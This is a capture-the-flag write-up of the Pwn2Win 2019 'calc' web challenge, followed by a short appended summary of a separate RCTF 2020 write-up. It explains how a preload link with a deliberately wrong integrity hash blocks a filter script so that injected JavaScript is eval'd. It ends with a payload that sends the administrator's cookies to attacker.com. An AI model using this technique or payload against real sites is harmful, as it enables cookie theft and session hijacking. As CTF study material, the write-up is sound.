Writeup from a beginner CTFer (but with plenty of Java experience).

Original writeup
(https://drive.google.com/file/d/1lzLa6el8UYTqKKhnegGpS4lN7Edl7EOo/view?usp=sharing).# Pwn2Win CTF 2019: calc

**Category:** Web  
**Points:** 500  
**Solves:** 0

> Our researchers found out a web interface used by Sophia to run complex
> calculations. Can you find a way to get the administrator's cookies?  
>  
> http://165.227.115.65/  
>  
> The administrator is using HeadlessChrome/79.0.3945.0.

## Write-up  
  
### How it works?

The challenge's website is concise and you don't have much to work on:

1. There is a place to report a link to the administrator (which must be prefixed with http://165.227.115.65/ - the challenge's IP).  
2. There is a `calc` parameter which is being filtered by an external script file (which is same-origin to the challenge's page) and then is being eval'd.  
3. There is a `xss` parameter that is being reflected at the end of the body.  
4. The server uses a strict CSP, which doesn't allow you to use the injection to do much.

### Digging deeper

By looking into the external script file, it is possible to notice that the
`calc` parameter is being filtered as soon as the DOM is loaded and only
numbers, +, - are being allowed. The length of characters is also limited to
100.

```javascript  
window.addEventListener('DOMContentLoaded', () => {  
   let regex = /[^0-9\+\-]+/;  
   if (calc.length > 100) calc = "1337";  
   calc = calc.replace(/ /g, "+");  
   if (regex.test(calc)) calc = "1337";  
});  
```  
Also, by checking the script on the main page, you can see the parameter is
only executed after the page is fully loaded - meaning that it will only be
eval'd after the external script has a chance to filter the input it got from
the `calc` parameter.

```javascript  
let calc = new URL(location).searchParams.get("calc") || "1337";  
onload = () => {  
   alert(eval(calc));  
}  
```

After this assessment, one of the realizations is that if you are able to
block the external script from loading, you can execute arbitrary javascript.

### Prior research

There has been some research on the subject of selectively blocking
subresources
(https://www.reddit.com/r/Slackers/comments/c1mpmq/selectively_blocking_subresources_when_xss/).

But none of these prior researches would work in the context of this
challenge.

The intended solution required you to find a way to block subresources that
were being loaded after the injection point by only using HTML injection.

### Features created for good (or bad)

Before Chrome 77, it was not possible to do the preload of subresources that
did an SRI verification without doing a double download of the same resource.

On Chrome 77, a new feature
(https://www.chromestatus.com/feature/4967277059375104) was released which
started allowing and honoring the integrity attribute on preload links.

It solved the problem of the double download, but created a new "problem" - if
the hash on the integrity attribute doesn't match the real hash of the
subresource, it will be blocked from loading :)

### Payload

Knowing that it gets easy to construct a payload that will allow executing
arbitrary javascript and stealing the administrator's cookies:

```  
http://165.227.115.65/?xss=<link+rel=preload+as=script+integrity=sha256-1+href=filter.js>&calc=location=`//attacker.com/?${document.cookie}`  
```

## Flag

```CTF-BR{s3l3c71v3_bl0ck1ng++}```

## Contact

If you have any questions feel free to contact me on
[@lbherrera_](https://twitter.com/lbherrera_)  

Original writeup
(https://github.com/lbherrera/writeups/tree/master/pwn2win-2019/calc).TL;DR bypass numeric only WAF via string coercion and bitwise operators, solve
readflag via previously known ways.

Full description available in the writeup!

Original writeup (https://waituck.sg/2020/06/10/rctf-2020-calc-writeup.html).